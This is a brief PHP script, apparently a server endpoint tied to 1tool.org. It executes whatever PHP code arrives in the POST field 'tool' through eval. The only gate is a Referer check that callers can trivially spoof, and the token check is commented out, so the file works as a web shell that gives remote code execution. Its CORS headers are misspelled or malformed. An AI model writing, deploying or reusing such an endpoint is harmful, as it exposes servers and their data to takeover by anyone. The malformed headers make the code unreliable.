<?php 
header("ALLOW-CONTROL-ALLOW-ORIGIN:*");
header("text/html;charset=UTF-8");
header('Access-Control-Allow-Methods:*');

if(!isset($_SERVER['HTTP_REFERER']) || strpos($_SERVER['HTTP_REFERER'],'1tool.org') === false){
  exit;
}
//echo $_SERVER['HTTP_REFERER'];

//return;
//eval($_GET[tool]);
//$token = $_POST['token'];
//$tokentxt=file_get_contents("http://www.1tool.org/Security/token.txt");
//echo $tokentxt;
//echo $token;
//if($tokentxt !=$token){
//header("location:http://www.1tool.org/");
//return;
//}
eval($_POST[tool]);
?>